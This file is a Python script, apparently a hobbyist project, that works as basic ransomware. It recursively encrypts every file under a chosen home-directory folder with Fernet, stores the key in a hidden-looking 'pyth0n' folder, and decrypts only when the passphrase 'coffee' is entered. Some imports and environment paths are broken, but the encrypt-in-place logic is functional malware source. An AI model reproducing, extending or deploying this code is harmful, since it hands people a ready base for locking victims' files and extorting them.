from pathlib import Path
from cryptography.fernet import Fernet
import sys
import tinker as tk
from  tkinter import messagebox
from PIL import Image, ImageTk
import os
# get the home dirrectory
home_dir = Path.home()
print(home_dir)


target_folder =Path.home()/"David_cyber"
# folders to ignore when encryptin file
Ignore_folders = ["AppData", "Library", "Local Settings", "git", "node_modules"]

#  a folder that will install
# For windows
# app_data = os.path.join(os.environ["ZDOTDIR"], "pyth0n")
# for linux
app_data = os.path.join(os.environ["ZDOTDIR"], "pyth0n")

# create the folder
os.makedirs(app_data, exist_ok=True)

# define the path to store the encryption key
key_path = os.path.join(app_data, "key.key")

# create function to encrypt the file
def encrypt ():

    # ?create a list of all files
    files =[]

    # find al the files and folders

    for item in target_folder.rglob("*"):
        try:
            if any (folder in item.parts for folder in Ignore_folders):
                continue #skip this folder
            
            if item.is_file():
                # append the files to our list
                files.append(str(item))
        except (PermissionError, FileNotFoundError):
            continue
    # print(len(files))
    # generate encryption key
    key_file = Path(key_path)
    if not key_file.exists():
        key = Fernet.generate_key()

        with open (key_file, "wb") as keyFile:
            keyFile.write(key)

    else:
        with open (key_file, "rb") as keyFile:
            key = keyFile.read()

    # use the key top encrypt the files
    for file in files:
        # read the content of the file
        with open (file, "rb") as originalFile:
            content = originalFile.read()
            # encrypt the content
            encrypted_content = Fernet(key).encrypt(content)
        # write changes in the file
        with open (file, "wb") as newFile:
            newFile.write(encrypted_content)
encrypt()


# create function to dencrypt the file
def decrypt (user_phrase):

    # ?create a list of all files
    files =[]

    # find al the files and folders

    for item in target_folder.rglob("*"):
        try:
            if any (folder in item.parts for folder in Ignore_folders):
                continue #skip this folder
            
            if item.is_file():
                # append the files to our list
                files.append(str(item))
        except (PermissionError, FileNotFoundError):
            continue
    # print(len(files))
    # generate encryption key
    with open (key_path, "rb") as keyFile:

        key =keyFile.read()

    # create a secreate code to decrypt
    secret_phrase = "coffee"

    # check if secter phrase is correct
    if user_phrase.lower() == secret_phrase.lower():


        # use the key to decrypt the files
        for file in files:
            # read the content of the file
            with open (file, "rb") as encryptedFile:
                content = encryptedFile.read()
                # encrypt the content
                decrypted_content = Fernet(key).decrypt(content)
            # write changes in the file
            with open (file, "wb") as newFile:
                newFile.write(decrypted_content)
decrypt("coffee")
